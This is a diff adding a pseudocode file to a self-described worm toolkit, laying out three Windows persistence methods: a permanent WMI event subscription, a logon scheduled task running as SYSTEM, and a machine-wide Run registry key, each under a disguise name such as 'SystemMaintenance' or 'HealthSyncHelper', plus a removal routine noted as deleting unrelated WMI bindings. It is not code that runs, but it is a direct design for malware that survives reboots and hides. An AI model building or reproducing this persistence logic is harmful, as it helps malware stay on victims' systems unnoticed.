@@ -1,0 +1,41 @@
+# +--------------------------------------------------------------------------+
+# |                                                                          |
+# |                       Veneficus Mini Worm Toolkit                        |
+# |                                                                          |
+# +--------------------------------------------------------------------------+
+
+# src/stay.pseudo
+# Three-way persistence. First success wins.
+
+FUNCTION install() -> bool:
+    RETURN wmi_pulse() OR task_on_logon() OR machine_run_key()
+
+FUNCTION current_image() -> path | none:
+    path of this process image
+
+FUNCTION wmi_pulse() -> bool:
+    # Permanent event subscription in the local WMI repository
+    filter  name: "PulseFilter"      # alias
+    consumer name: "PulseAction"     # alias
+    query:  periodic system-uptime sample, fire after ~2 minutes
+    action: launch current_image()
+    invoked via a one-shot elevated script host
+
+FUNCTION task_on_logon() -> bool:
+    task name: "SystemMaintenance"   # alias
+    trigger: on logon
+    run as:  SYSTEM
+    action:  current_image()
+
+FUNCTION machine_run_key() -> bool:
+    hive: machine-wide Run list      # needs admin; no user-hive fallback
+    value name: "HealthSyncHelper"   # alias
+    data: current_image()
+
+FUNCTION remove() -> bool:
+    delete PulseFilter / PulseAction
+    # Defect: the private uninstaller also deletes unrelated
+    # filter-to-consumer bindings. Do not copy that behavior.
+    delete task "SystemMaintenance"
+    delete Run value "HealthSyncHelper"
+    RETURN true
